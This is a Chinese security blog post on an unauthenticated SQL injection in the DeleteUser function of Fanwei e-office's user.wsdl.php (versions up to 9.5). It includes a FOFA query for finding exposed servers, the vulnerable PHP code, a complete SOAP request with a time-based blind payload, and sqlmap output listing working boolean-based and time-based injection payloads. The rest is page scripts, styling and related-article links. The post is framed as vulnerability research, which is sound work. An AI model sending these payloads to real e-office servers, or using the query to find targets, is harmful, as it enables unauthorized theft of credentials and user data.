---
title: "泛微e-office user.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-user-wsdl-sqli.html
asset_dir: assets/泛微e-office-user.wsdl.php-sql注入漏洞
---

# 泛微e-office user.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/19 08:22
* 759浏览
* [0评论](#comment)
* 33分钟阅读

深入探索

安全认证考试

在线安全工具

Web安全书籍


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office user.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

代码安全审计

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

同样通过解析 wsdl 后有三个功能

深入探索

安全

文件大小转换

云安全解决方案

[![泛微e-office user.wsdl.php sql注入漏洞](images/img-001-8c94ad681417.webp)](https://image.mrxn.net/dce11fc648a241119b5a546aa270b650.webp)

这里只拿第一个来简单过一遍

漏洞扫描服务

webservice-json/user/user.wsdl.php 的 `DeleteUser` 业务逻辑如下

```
function DeleteUser( $userID )
{
    checkcurrentsession( );
    $user = new user( );
    $deleteResult = $user->deleteUser( $userID );
    return $deleteResult;
}
```

`$userID` 带入 `deleteUser` 函数

深入探索

网络安全会议

技术文章订阅

安全研究报告

```
    public function deleteUser( $userid )
    {
        global $connection;
        if ( !$userid )
        {
            return false;
        }
        else
        {
            $query = "SELECT * FROM user WHERE USER_ID='".$userid."'";
            $res = exequery( $connection, $query );
```

`$userid` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /webservice-json/user/user.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:UserServicewsdl#DeleteUser
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:UserServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:DeleteUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <userID xsi:type="xsd:string">gero' AND 4558=BENCHMARK(5000000,MD5(0x45525845))-- dfax</userID>
      </urn:DeleteUser>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office user.wsdl.php sql注入漏洞](images/img-002-387dedec52d0.webp)](https://image.mrxn.net/fe0a7674d5d048b2aac93e7256873c29.webp)

成功在延时 5 秒

物流软件安全

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 1245 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:UserServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:DeleteUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <userID xsi:type="xsd:string">gero' RLIKE (SELECT (CASE WHEN (5038=5038) THEN 0x6765726f ELSE 0x28 END))-- iFxC</userID>
      </urn:DeleteUser>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:UserServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:DeleteUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <userID xsi:type="xsd:string">gero' AND 4558=BENCHMARK(5000000,MD5(0x45525845))-- dfax</userID>
      </urn:DeleteUser>
   </soapenv:Body>
</soapenv:Envelope>
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office user.wsdl.php sql注入漏洞](https://mrxn.net/jswz/eoffice-webservice-json-user-wsdl-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-webservice-json-user-wsdl-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-user-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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